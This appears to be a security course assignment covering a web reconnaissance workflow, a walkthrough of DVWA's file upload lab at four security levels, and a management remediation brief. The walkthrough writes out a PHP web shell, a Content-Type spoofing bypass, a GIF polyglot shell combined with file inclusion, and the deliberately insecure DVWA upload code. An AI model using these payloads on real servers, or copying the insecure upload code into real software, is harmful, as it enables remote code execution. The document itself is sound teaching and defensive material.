# Assignment: Recon Workflows & File Upload Vulnerability Analysis

**Module/Course Code:** /s09-recon-and-upload

---

## Task 1: Ten-Step Reconnaissance Workflow 

The following structured workflow outlines a systematic web reconnaissance methodology designed to map the attack surface, identify technologies, discover endpoints, and locate potential file handling features.

### Workflow Matrix

| Step | Core Question | Primary Tool | Expected Output | Stopping Condition |
| :--- | :--- | :--- | :--- | :--- |
| **1. Target Scope & ASN Mapping** | What IP ranges and Autonomous Systems belong to the target organization? | `bgp.he.net` / `amass intel` | Discovered ASNs, IP blocks, and top-level domain associations. | All organization-owned ASNs and registered root domains are cataloged. |
| **2. Passive Subdomain Enumeration** | What subdomains exist across public datasets and Certificate Transparency logs? | `subfinder` | List of unverified passive subdomain records. | Query returns zero new unique subdomains across all passive sources. |
| **3. Active DNS Resolution & Filtering** | Which discovered subdomains actively resolve to live IP addresses? | `dnsx` | Verified list of resolving subdomains paired with A/AAAA records. | Every candidate domain from Step 2 has been queried against recursive resolvers. |
| **4. HTTP Service Probing** | Which resolved hosts run web services, and on what ports/TLS configurations? | `httpx` | List of live URLs, HTTP status codes, web server headers, and page titles. | All alive host:port combinations have returned an HTTP status response or connection timeout. |
| **5. Technology Stack Fingerprinting** | What web frameworks, CMS platforms, language runtimes, and server software are in use? | `wappalyzer-cli` / `whatweb` | Identified tech stack (e.g., PHP 8.1, Nginx 1.20, WordPress, Express). | Primary web server, backend scripting language, and framework are identified per host. |
| **6. Content & Endpoint Discovery** | What hidden directories, administration portals, and file upload endpoints exist? | `feroxbuster` | Discovered directory paths, administrative endpoints, and API routes. | Recursion depth limit reached and directory brute-force wordlist completes. |
| **7. JavaScript Static Analysis** | What internal API endpoints, parameters, and secret keys are embedded in client scripts? | `Katana` + `JSLuice` | Extracted hidden API routes, endpoints, dynamic parameters, and hardcoded tokens. | All JavaScript bundles loaded by the application have been parsed and extracted. |
| **8. Dynamic Crawling & Form Mapping** | Where are input parameters, multi-part forms, and upload capabilities located? | `OWASP ZAP (AJAX Spider)` | Interactive sitemap detailing interactive forms, state-changing POST endpoints, and upload inputs. | No new unique form inputs or client-side routes are rendered during browser automation. |
| **9. Parameter Discovery** | What hidden or unlinked HTTP request parameters are accepted by key endpoints? | `arjun` | Identified hidden GET/POST request parameters (e.g., `?debug=`, `?file=`, `?upload_path=`). | Parameter brute-force against candidate endpoints concludes. |
| **10. Proxy Interception Baseline** | How does the application behave during valid form submissions and file uploads? | `Burp Suite Professional` | Baseline HTTP requests/responses showing valid authentication tokens, headers, and parameter flows. | Standard baseline request/response cycle for legitimate user workflows is fully captured. |

### Tool Choice Justification

* **Tool Choice:** `feroxbuster` (Rust-based recursive directory brute-forcing tool) instead of standard Python-based crawlers.
* **Justification:** Unlike single-threaded or standard multi-threaded web crawlers used in generic lab demonstrations, `feroxbuster` leverages asynchronous Rust network streams, enabling high-performance recursive directory discovery. In modern web environments with deeply nested directory structures, its dynamic response filtering prevents false positives caused by custom 404 pages while maintaining speed across high-latency target servers.

---

## Task 2: DVWA File Upload Walkthrough across All 4 Security Levels 

---

### Security Level: Low

#### 1. Vulnerability Analysis & Mechanism
At the Low security level, the application performs no validation on uploaded files. It relies on the client providing a file via an HTTP POST request and moves it directly to the public upload directory (`../../hackable/uploads/`).

#### 2. Source Code / Logic Review
```php
<?php
if( isset( $_POST[ 'Upload' ] ) ) {
    // Target directory destination
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    // Direct file move without type checking or extension validation
    if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
        echo '<pre>Your image was not uploaded.</pre>';
    } else {
        echo "<pre>{$target_path} succesfully uploaded!</pre>";
    }
}
?>
```

#### 3. Exploitation & Bypass Steps
1. Prepare a test file named `shell.php` containing a simple execution test script:
   ```php
   <?php system($_GET['cmd']); ?>
   ```
2. Intercept the upload request using an intercepting proxy (Burp Suite) or submit it via the web interface.
3. Observe the server response:
   ```text
   ../../hackable/uploads/shell.php successfully uploaded!
   ```
4. Access the target path directly in the browser to execute system commands:
   `http://dvwa.local/hackable/uploads/shell.php?cmd=id`
5. **Observed Execution Privileges:** `www-data` (Standard unprivileged web server execution context).

---

### Security Level: Medium

#### 1. Vulnerability Analysis & Mechanism
The Medium security level introduces basic client-side/header validation by inspecting the HTTP `Content-Type` header sent in the multi-part request body. It only allows files reported as `image/jpeg` or `image/png` and limits file size.

#### 2. Source Code / Logic Review
```php
<?php
if( isset( $_POST[ 'Upload' ] ) ) {
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    // Checking client-supplied MIME type and file size
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
    $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];

    if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) &&
        ( $uploaded_size < 100000 ) ) {

        if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
            echo '<pre>Your image was not uploaded.</pre>';
        } else {
            echo "<pre>{$target_path} succesfully uploaded!</pre>";
        }
    } else {
        echo '<pre>Your image was not uploaded. We only accept JPEG or PNG images.</pre>';
    }
}
?>
```

#### 3. Exploitation & Bypass Steps
1. Select the `shell.php` file for upload.
2. Intercept the outgoing HTTP POST request in Burp Suite.
3. Observe the client-supplied header inside the request payload:
   ```http
   Content-Disposition: form-data; name="uploaded"; filename="shell.php"
   Content-Type: application/x-php
   ```
4. Modify the `Content-Type` header line to simulate a standard JPEG upload:
   ```http
   Content-Type: image/jpeg
   ```
5. Forward the request. The server accepts the payload because `uploaded_type` evaluates to `image/jpeg`.
6. Access `../../hackable/uploads/shell.php` to execute code under `www-data`.

---

### Security Level: High

#### 1. Vulnerability Analysis & Mechanism
At High security, the application validates the file extension using string manipulation (`strrpos`) to ensure it ends with `.jpg`, `.jpeg`, or `.png`. Additionally, it uses PHP's `getimagesize()` function to inspect the binary header of the uploaded file for valid image dimensions.

#### 2. Source Code / Logic Review
```php
<?php
if( isset( $_POST[ 'Upload' ] ) ) {
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1 );
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
    $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];

    // Validates extension AND checks binary image header via getimagesize()
    if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) &&
        ( $uploaded_size < 100000 ) &&
        ( getimagesize( $uploaded_tmp ) !== false ) ) {

        if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) {
            echo '<pre>Your image was not uploaded.</pre>';
        } else {
            echo "<pre>{$target_path} succesfully uploaded!</pre>";
        }
    } else {
        echo '<pre>Your image was not uploaded.</pre>';
    }
}
?>
```

#### 3. Exploitation & Bypass Steps
1. **Construct a Polyglot Image File:** Combine valid GIF/JPEG magic bytes (`GIF89a;`) with PHP code to satisfy `getimagesize()`.
2. Save the file as `shell.png` (matching the required file extension):
   ```text
   GIF89a;
   <?php system($_GET['cmd']); ?>
   ```
3. Upload `shell.png`. The file passes both the extension check (`.png`) and the binary header check (`getimagesize()` reads `GIF89a;`).
4. **Execution Phase (Secondary Vulnerability):** Because the file extension remains `.png`, the Apache/Nginx web server executes it as a static image rather than PHP script.
5. To execute the embedded script, combine this with a File Inclusion (LFI) vulnerability present on the system:
   `http://dvwa.local/vulnerabilities/fi/?page=file:///var/www/html/hackable/uploads/shell.png&cmd=id`
6. Executed Context: `www-data`.

---

### Security Level: Impossible

#### 1. Vulnerability Analysis & Defense Depth
The Impossible security level implements true secure file handling by using strict server-side controls:
* Re-encoding the image using PHP's GD library (`imagecreatefromjpeg` / `imagecreatefrompng`), which strips out non-image metadata, EXIF headers, and unformatted PHP strings.
* Generating a completely random MD5 token for the stored file name, stripping user-controlled file names.
* Enforcing strict extension matching.
* Utilizing Anti-CSRF token defense.

#### 2. Source Code & Defensive Breakdown
```php
<?php
if( isset( $_POST[ 'Upload' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1 );
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
    $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];

    // Step 1: Strict extension check against whitelist
    if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) &&
        ( $uploaded_size < 100000 ) &&
        ( getimagesize( $uploaded_tmp ) !== false ) ) {

        // Step 2: Generate random, non-predictable filename
        $file_name = md5( uniqid( rand(), true ) ) . '.' . $uploaded_ext;
        $target_path = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/" . $file_name;

        // Step 3: Re-encode image to strip any embedded code execution vectors
        if( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" ) {
            $img = imagecreatefromjpeg( $uploaded_tmp );
            imagejpeg( $img, $target_path, 100 );
        } else {
            $img = imagecreatefrompng( $uploaded_tmp );
            imagepng( $img, $target_path );
        }
        imagedestroy( $img );

        echo "<pre><a href='{$target_path}'>{$target_path}</a> succesfully uploaded!</pre>";
    } else {
        echo '<pre>Your image was not uploaded.</pre>';
    }
}
generateSessionToken();
?>
```

#### 3. Contribution of Each Security Control

1. **Re-encoding Image Buffers (`imagecreatefrompng` / `imagecreatefromjpeg`):**
   Renders the image pixel data into a new image buffer in memory before writing to disk. Any injected text strings, polyglot payloads, or hidden embedded commands in EXIF metadata are stripped out.

2. **Randomized File Naming (`md5(uniqid(...))`):**
   Prevents path traversal attacks, double-extension tricks (`file.php.png`), and null-byte injection by discarding user-controlled file names entirely.

3. **Strict Whitelist & Execution Context Isolation:**
   Enforces a strict extension whitelist and ensures uploaded media files are stored in a designated directory.

---

## Task 3: Remediation Brief for Non-Technical Management

### Executive Summary: Unrestricted File Upload Risks

**To:** Executive Leadership & Management  
**Subject:** Security Risks Associated with Unrestricted Document Upload Features  
**Risk Level:** High / Critical Impact  

#### The Core Problem
Our current web application allows users and external clients to submit files (such as profile pictures, document attachments, and verification forms) directly to our server infrastructure. When an application accepts external files without strictly validating what they contain and how the server stores them, external visitors can trick our systems into processing untrusted instructions.

Rather than storing the uploaded file as a passive image or document, the application server can be manipulated into running code contained within that file. This grants unauthorized external parties direct, interactive control over the underlying web server hosting our applications.

#### Business Impact & Exposure
If an unvalidated file feature is manipulated by an unauthorized actor, the consequences include:

* **Unauthorized Access to Internal Data:** The external actor can read sensitive database configurations, internal application code, customer records, and corporate files stored on the machine.
* **Service Interruption & Infrastructure Disruption:** An unauthorized user gaining control over the application server can modify web content, corrupt critical files, or shut down business services.
* **Lateral Movement:** The compromised application machine can be used as a stepping stone to pivot deeper into our corporate network.

#### Mandatory Technical & Architectural Changes Required

To resolve this issue completely across all corporate applications, the engineering team must implement three foundational architecture controls:

```
[ User Upload ] ──> [ Strict Server Whitelist Check ] ──> [ Strip Metadata & Re-encode ] ──> [ Isolated Storage (No Execution) ]
```

1. **Re-encode All Stored Files:**
   All uploaded media must be stripped of original user metadata and re-rendered through server-side image processing tools before being saved. This strips out embedded script content before the file touches disk storage.

2. **Randomize Stored File Names & Discard Original Headers:**
   User-provided file names must never be saved directly to our operating system. Uploaded files must be renamed automatically using randomly generated reference keys (e.g., `a8f92b...png`).

3. **Disable Code Execution in Upload Directories:**
   All uploaded content must be stored in a isolated storage location (or dedicated Cloud Object Storage service) configured with strict security rules that prohibit the web server from executing *any* file stored within that location as runnable software.

---